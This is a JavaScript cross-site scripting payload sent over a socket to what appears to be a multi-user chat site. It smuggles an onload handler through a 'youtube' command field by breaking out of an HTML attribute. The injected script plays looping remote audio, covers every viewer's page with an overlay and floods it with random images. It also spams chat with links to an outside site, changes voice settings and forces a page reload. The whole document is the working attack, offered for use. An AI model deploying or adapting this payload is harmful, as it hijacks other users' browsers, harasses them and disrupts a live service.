socket.emit('command', {
  list: [
    'youtube',
    `eee" onload="
const audio = new Audio('https://files.catbox.moe/upks3d.mp3');
audio.loop = true;
audio.play();
const background = document.createElement('div');

background.style.position = 'fixed';
background.style.top = '0';
background.style.left = '0';

background.style.width = '3000vw';
background.style.height = '3000vh';

background.style.backgroundColor = '#6d33a0';
background.style.zIndex = '999';

document.body.appendChild(background);
setInterval(function(){
const img = document.createElement('img');

img.src = 'https://files.catbox.moe/yuyv5m.png';
img.style.position = 'absolute';
img.style.top = Math.floor(Math.random()*window.innerHeight) + 'px';
img.style.left = Math.floor(Math.random()*window.innerWidth) + 'px';
img.style.zIndex = '9999';

document.body.appendChild(img);
socket.emit('command', {list: ['speed', Math.floor(Math.random()*275)]});
socket.emit('command', {list: ['pitch', Math.floor(Math.random()*125)]});
socket.emit('talk', {text: 'https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio'});
}, 300);
setTimeout(()=>{
window.location.reload();
}, 15000);
"`
  ]
});
